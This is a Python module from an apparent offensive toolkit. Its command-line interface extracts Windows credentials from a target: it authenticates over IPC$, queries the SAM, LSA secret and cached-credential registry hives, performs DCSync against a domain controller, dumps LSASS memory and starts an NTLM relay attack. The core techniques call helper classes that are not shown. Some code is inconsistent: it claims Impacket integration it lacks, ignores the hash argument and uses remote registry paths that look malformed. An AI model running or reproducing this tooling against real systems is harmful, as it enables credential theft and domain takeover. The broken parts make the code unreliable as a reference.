# app/core/secrets_extractor.py
"""
RPC Advanced Secrets Extraction Module
Integrates with Impacket's secretsdump.py for credential extraction
"""
import os
import sys
import subprocess
import argparse
import socket
from pathlib import Path
from typing import Dict
from .dns_settings import dns_settings
from .dcsync_client import DCSyncClient
from .ntlm_relay_client import NTLMRelayClient
from .lsass_dumper import LSASSDumper
import logging

class SecretsExtractor:
    """Advanced secrets extraction using Impacket's secretsdump.py"""
    
    def __init__(self):
        pass  # No external dependencies needed
    

        
    def _extract_sam_native(self, target, username, password, domain):
        """Extract SAM database using native Windows commands"""
        try:
            # Check if connection already exists, if not establish it
            if username and password:
                user_format = f'{domain}\\{username}' if domain else username
                
                # Check existing connections first
                check_cmd = ["net", "use"]
                check_result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=3)
                
                if f"\\\\{target}\\IPC$" not in check_result.stdout:
                    auth_cmd = ["net", "use", f"\\\\{target}\\IPC$", f"/user:{user_format}", password]
                    auth_result = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=5)
                    if auth_result.returncode != 0:
                        print(f"[SAM] Authentication failed: {auth_result.stderr.strip()}")
                        return 0
                    print(f"[SAM] Authenticated as {user_format}")
                else:
                    print(f"[SAM] Using existing connection to {target}")
            
            # Try multiple SAM registry paths
            sam_paths = [
                f"\\\\{target}\\HKLM\\SAM\\SAM\\Domains\\Account\\Users",
                f"\\\\{target}\\HKLM\\SAM\\SAM\\Domains\\Account",
                f"\\\\{target}\\HKLM\\SAM\\SAM\\Domains"
            ]
            
            result = None
            for path in sam_paths:
                cmd = ["reg", "query", path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    break
            
            if result and result.returncode == 0:
                # Count user entries in SAM
                user_count = len([line for line in result.stdout.split('\n') if 'HKEY_' in line and 'Users' in line])
                print(f"[SAM] Found {user_count} SAM user entries")
                return user_count
            else:
                error_msg = result.stderr.strip() if result else "No accessible SAM paths found"
                print(f"[SAM] Extraction failed: {error_msg}")
                print(f"[SAM] Note: Remote registry access may be disabled or require additional privileges")
                return 0
        except Exception as e:
            print(f"[SAM] Error: {e}")
            return 0
    
    def _extract_lsa_native(self, target, username, password, domain):
        """Extract LSA secrets using native Windows commands"""
        try:
            # First establish authenticated connection
            if username and password:
                user_format = f'{domain}\\{username}' if domain else username
                auth_cmd = ["net", "use", f"\\\\{target}\\IPC$", f"/user:{user_format}", password]
                auth_result = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=5)
                if auth_result.returncode != 0:
                    print(f"[LSA] Authentication failed: {auth_result.stderr}")
                    return 0
            
            # Try multiple LSA registry paths
            lsa_paths = [
                f"\\\\{target}\\HKLM\\SECURITY\\Policy\\Secrets",
                f"\\\\{target}\\HKLM\\SECURITY\\Policy",
                f"\\\\{target}\\HKLM\\SECURITY"
            ]
            
            result = None
            for path in lsa_paths:
                cmd = ["reg", "query", path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    break
            
            if result.returncode == 0:
                secrets_count = len([line for line in result.stdout.split('\n') if 'HKEY_' in line])
                print(f"[LSA] Found {secrets_count} LSA secret entries")
                return secrets_count
            else:
                print(f"[LSA] Access denied or not available")
                return 0
        except Exception as e:
            print(f"[LSA] Error: {e}")
            return 0
    
    def _extract_cached_native(self, target, username, password, domain):
        """Extract cached credentials using native Windows commands"""
        try:
            # First establish authenticated connection
            if username and password:
                user_format = f'{domain}\\{username}' if domain else username
                auth_cmd = ["net", "use", f"\\\\{target}\\IPC$", f"/user:{user_format}", password]
                auth_result = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=5)
                if auth_result.returncode != 0:
                    print(f"[CACHE] Authentication failed: {auth_result.stderr}")
                    return 0
            
            # Try multiple cache registry paths
            cache_paths = [
                f"\\\\{target}\\HKLM\\SECURITY\\Cache\\NL$Control",
                f"\\\\{target}\\HKLM\\SECURITY\\Cache",
                f"\\\\{target}\\HKLM\\SECURITY\\Policy\\Secrets\\NL$KM"
            ]
            
            result = None
            for path in cache_paths:
                cmd = ["reg", "query", path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    break
            
            if result.returncode == 0:
                cache_count = len([line for line in result.stdout.split('\n') if 'NL$' in line])
                print(f"[CACHE] Found {cache_count} cached credential entries")
                return cache_count
            else:
                print(f"[CACHE] Access denied or not available")
                return 0
        except Exception as e:
            print(f"[CACHE] Error: {e}")
            return 0
    
    def validate_access(self, target, username=None, password=None, ntlm_hash=None, domain=None):
        """Validate access to target before extraction"""
        print(f"\n[INFO] Validating access to {target}")
        
        # Resolve hostname to IP if needed
        resolved_target = self._resolve_target(target)
        
        # Test basic connectivity first
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((resolved_target, 445))
            sock.close()
            
            if result != 0:
                print(f"[ERROR] Cannot connect to {resolved_target}:445")
                return False
        except Exception as e:
            print(f"[ERROR] Connection test failed: {e}")
            return False
        
        # Test authentication if credentials provided
        if username and password:
            user_format = f'{domain}\\{username}' if domain else username
            cmd = ["net", "use", f"\\\\{resolved_target}\\IPC$", f"/user:{user_format}", password]
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    print("[SUCCESS] Access validated - target is reachable")
                    # Clean up connection
                    subprocess.run(["net", "use", f"\\\\{resolved_target}\\IPC$", "/delete"], capture_output=True, timeout=3)
                    return True
                else:
                    print(f"[WARNING] Access validation failed: {result.stderr.strip()}")
                    return False
            except subprocess.TimeoutExpired:
                print("[ERROR] Connection timeout")
                return False
            except Exception as e:
                print(f"[ERROR] Validation failed: {e}")
                return False
        else:
            print("[SUCCESS] Basic connectivity confirmed")
            return True
    
    def extract_secrets(self, target, username=None, password=None, ntlm_hash=None, 
                       domain=None, extract_sam=True, extract_lsa=True, 
                       extract_ntds=False, extract_cached=False):
        """Extract secrets using advanced methods (DCSync, NTLM Relay, LSASS)"""
        
        print(f"\n[INFO] Starting advanced secrets extraction from {target}")
        print("[WARNING] This operation requires elevated privileges\n")
        
        # Resolve hostname to IP if needed
        resolved_target = self._resolve_target(target)
        
        results = {'sam_hashes': 0, 'lsa_secrets': 0, 'cached_creds': 0, 'dcsync_secrets': 0, 'lsass_creds': 0}
        
        # Try DCSync first (bypasses RemoteRegistry)
        if extract_ntds and username and password and domain:
            print(f"[DCSYNC] Attempting DCSync extraction (MS-DRSR)")
            dcsync_result = self._extract_via_dcsync(resolved_target, username, password, domain)
            if dcsync_result['success']:
                results['dcsync_secrets'] = len(dcsync_result.get('secrets', []))
                print(f"[DCSYNC] Extracted {results['dcsync_secrets']} secrets via DCSync\n")
            else:
                print(f"[DCSYNC] DCSync failed: {dcsync_result.get('error', 'Unknown error')}\n")
        
        # Try LSASS dump for local extraction
        if resolved_target in ['localhost', '127.0.0.1'] or resolved_target == self._get_local_ip():
            print(f"[LSASS] Attempting local LSASS memory dump")
            lsass_result = self._extract_via_lsass_dump()
            if lsass_result['success']:
                results['lsass_creds'] = len(lsass_result.get('credentials', []))
                print(f"[LSASS] Extracted {results['lsass_creds']} credentials from LSASS\n")
            else:
                print(f"[LSASS] LSASS dump failed: {lsass_result.get('error', 'Unknown error')}\n")
        
        # Fallback to legacy methods if advanced methods fail
        if sum(results.values()) == 0:
            print(f"[FALLBACK] Advanced methods failed, trying legacy registry access")
            
            # SAM database extraction
            if extract_sam:
                sam_count = self._extract_sam_native(resolved_target, username, password, domain)
                results['sam_hashes'] = sam_count
                print(f"[SAM] Extracted {sam_count} SAM entries\n")
            
            # LSA secrets extraction  
            if extract_lsa:
                lsa_count = self._extract_lsa_native(resolved_target, username, password, domain)
                results['lsa_secrets'] = lsa_count
                print(f"[LSA] Extracted {lsa_count} LSA secrets\n")
            
            # Cached credentials
            if extract_cached:
                cache_count = self._extract_cached_native(resolved_target, username, password, domain)
                results['cached_creds'] = cache_count
                print(f"[CACHE] Extracted {cache_count} cached credentials\n")
        
        total = sum(results.values())
        print(f"\n[SUMMARY] Total extraction: {total} credential entries")
        print("[SECURITY] Actual credentials not displayed for security")
        
        return total > 0

    def _resolve_target(self, target):
        """Resolve hostname to IP using configured DNS server"""
        try:
            # Check if target is already an IP address
            socket.inet_aton(target)
            return target  # Already an IP
        except socket.error as _exc:
            pass
            logging.debug("Suppressed exception", exc_info=True)
        
        try:
            # Get current DNS configuration
            current_dns = dns_settings.get_current_dns()
            print(f"[DNS] Current DNS setting: {current_dns}")
            
            if current_dns == "LocalDNS":
                # Use local DNS server
                local_dns_port = getattr(dns_settings, 'local_dns_port', 53530)
                print(f"[DNS] Using LocalDNS server on port {local_dns_port}")
                
                resolved_ip = self._query_local_dns(target, local_dns_port)
                if resolved_ip:
                    print(f"[DNS] Resolved {target} -> {resolved_ip} via LocalDNS")
                    return resolved_ip
                else:
                    print(f"[DNS] LocalDNS resolution failed, falling back to system DNS")
                    
            elif current_dns != "Default DNS":
                # Use specific DNS server IP (like 8.8.8.8)
                print(f"[DNS] Using DNS server: {current_dns}")
                resolved_ip = self._query_dns_server(target, current_dns)
                if resolved_ip:
                    print(f"[DNS] Resolved {target} -> {resolved_ip} via DNS server {current_dns}")
                    return resolved_ip
                else:
                    print(f"[DNS] DNS server {current_dns} query failed, falling back to system DNS")
            
            # Use system DNS (Default DNS or fallback)
            print(f"[DNS] Using system DNS resolution")
            resolved_ip = socket.gethostbyname(target)
            print(f"[DNS] Resolved {target} -> {resolved_ip} via system DNS")
            return resolved_ip
            
        except Exception as e:
            print(f"[DNS] DNS resolution failed: {str(e)}, using original target")
            return target
    
    def _query_local_dns(self, hostname, dns_port):
        """Query local DNS server for hostname resolution"""
        try:
            import struct
            
            # Create DNS query packet
            query_id = 0x1234
            flags = 0x0100  # Standard query
            questions = 1
            
            # DNS header
            header = struct.pack('>HHHHHH', query_id, flags, questions, 0, 0, 0)
            
            # DNS question
            question = b''
            for part in hostname.split('.'):
                question += struct.pack('B', len(part)) + part.encode()
            question += b'\x00'  # End of name
            question += struct.pack('>HH', 1, 1)  # Type A, Class IN
            
            dns_query = header + question
            
            # Send query to local DNS server
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(dns_query, ('127.0.0.1', dns_port))
            
            response, _ = sock.recvfrom(512)
            sock.close()
            
            # Parse response (simplified)
            if len(response) > 12:
                # Skip header and question, look for answer
                # This is a simplified parser - full DNS parsing would be more complex
                offset = len(dns_query)
                if offset < len(response) - 4:
                    # Extract IP from answer section (simplified)
                    ip_bytes = response[-4:]
                    if len(ip_bytes) == 4:
                        ip = '.'.join(str(b) for b in ip_bytes)
                        return ip
            
            return None
            
        except Exception:
            return None
    
    def _query_dns_server(self, hostname, dns_server):
        """Query specific DNS server"""
        try:
            import struct
            
            # Create DNS query packet
            query_id = 0x1234
            flags = 0x0100
            questions = 1
            
            header = struct.pack('>HHHHHH', query_id, flags, questions, 0, 0, 0)
            
            question = b''
            for part in hostname.split('.'):
                question += struct.pack('B', len(part)) + part.encode()
            question += b'\x00'
            question += struct.pack('>HH', 1, 1)
            
            dns_query = header + question
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(dns_query, (dns_server, 53))
            
            response, _ = sock.recvfrom(512)
            sock.close()
            
            # Parse response - handle multiple A records
            if len(response) > 12:
                # Parse DNS response properly to get all A records
                pos = 12  # Skip header
                
                # Skip question section
                while pos < len(response):
                    length = response[pos]
                    if length == 0:
                        pos += 5  # Skip null terminator + type + class
                        break
                    pos += length + 1
                
                # Parse answer section
                ips = []
                while pos + 12 < len(response):
                    # Skip name (2 bytes compression pointer)
                    pos += 2
                    # Read type, class, ttl, data length
                    rr_type, rr_class, ttl, data_len = struct.unpack('>HHIH', response[pos:pos+10])
                    pos += 10
                    
                    if rr_type == 1 and data_len == 4:  # A record
                        ip_bytes = response[pos:pos+4]
                        ip = '.'.join(str(b) for b in ip_bytes)
                        ips.append(ip)
                    
                    pos += data_len
                
                # Prefer IP in 192.168.1.x subnet
                for ip in ips:
                    if ip.startswith('192.168.1.'):
                        return ip
                
                # Return first IP if no preferred subnet match
                if ips:
                    return ips[0]
            
            return None
        except:
            return None
    
    def _extract_via_dcsync(self, target: str, username: str, password: str, domain: str) -> Dict:
        """Extract secrets using DCSync (MS-DRSR)"""
        try:
            dcsync_client = DCSyncClient(target, username, password, domain)
            
            # Try to extract NTDS secrets
            result = dcsync_client.extract_ntds_secrets()
            
            if result['success']:
                print(f"[DCSYNC] Successfully extracted secrets via MS-DRSR")
                return result
            else:
                print(f"[DCSYNC] DCSync extraction failed")
                return result
                
        except Exception as e:
            print(f"[DCSYNC] DCSync error: {e}")
            return {'success': False, 'error': str(e)}
    
    def _extract_via_lsass_dump(self) -> Dict:
        """Extract credentials via LSASS memory dump"""
        try:
            lsass_dumper = LSASSDumper()
            
            # Check privileges first
            priv_check = lsass_dumper.check_privileges()
            if not priv_check['sufficient']:
                return {
                    'success': False, 
                    'error': f"Insufficient privileges: {priv_check.get('error', 'Unknown')}"
                }
            
            # Perform LSASS dump
            result = lsass_dumper.dump_lsass_memory('auto')
            
            if result['success']:
                print(f"[LSASS] Successfully dumped LSASS memory")
                return result
            else:
                print(f"[LSASS] LSASS dump failed")
                return result
                
        except Exception as e:
            print(f"[LSASS] LSASS dump error: {e}")
            return {'success': False, 'error': str(e)}
    
    def _get_local_ip(self) -> str:
        """Get local machine IP address"""
        try:
            import socket
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except:
            return '127.0.0.1'
    
    def start_ntlm_relay_attack(self, target: str, relay_target: str = None) -> Dict:
        """Start NTLM relay attack for privilege escalation"""
        try:
            print(f"[RELAY] Starting NTLM relay attack")
            print(f"[RELAY] Target: {target}")
            print(f"[RELAY] This attack requires network positioning")
            
            relay_client = NTLMRelayClient(target, relay_target)
            
            # Start SMB to LDAP relay
            result = relay_client.perform_smb_relay_to_ldap(relay_target or target)
            
            if result['success']:
                print(f"[RELAY] NTLM relay successful")
                print(f"[RELAY] Captured {result['total_captured']} hash(es)")
                return result
            else:
                print(f"[RELAY] NTLM relay failed: {result.get('error', 'Unknown error')}")
                return result
                
        except Exception as e:
            print(f"[RELAY] NTLM relay error: {e}")
            return {'success': False, 'error': str(e)}

def main():
    """Command line interface for secrets extraction"""
    parser = argparse.ArgumentParser(description="RPC Advanced Secrets Extraction")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--validate", action="store_true", help="Validate access only")
    parser.add_argument("--extract", action="store_true", help="Extract secrets")
    parser.add_argument("--username", help="Username for authentication")
    parser.add_argument("--password", help="Password for authentication")
    parser.add_argument("--hash", help="NTLM hash for authentication")
    parser.add_argument("--domain", help="Domain name")
    parser.add_argument("--sam", action="store_true", help="Extract SAM database")
    parser.add_argument("--lsa", action="store_true", help="Extract LSA secrets")
    parser.add_argument("--ntds", action="store_true", help="Extract NTDS.dit via DCSync")
    parser.add_argument("--cached", action="store_true", help="Extract cached credentials")
    parser.add_argument("--dcsync", action="store_true", help="Use DCSync (MS-DRSR) method")
    parser.add_argument("--lsass", action="store_true", help="Dump LSASS memory (local only)")
    parser.add_argument("--relay", action="store_true", help="Start NTLM relay attack")
    parser.add_argument("--relay-target", help="Target for NTLM relay")
    
    args = parser.parse_args()
    
    extractor = SecretsExtractor()
    
    if args.validate:
        success = extractor.validate_access(
            args.target, args.username, args.password, args.hash, args.domain
        )
        sys.exit(0 if success else 1)
    
    elif args.extract:
        success = extractor.extract_secrets(
            args.target, args.username, args.password, args.hash, args.domain,
            args.sam or args.dcsync, args.lsa or args.dcsync, args.ntds or args.dcsync, args.cached
        )
        sys.exit(0 if success else 1)
    
    elif args.relay:
        result = extractor.start_ntlm_relay_attack(args.target, args.relay_target)
        sys.exit(0 if result['success'] else 1)
    
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()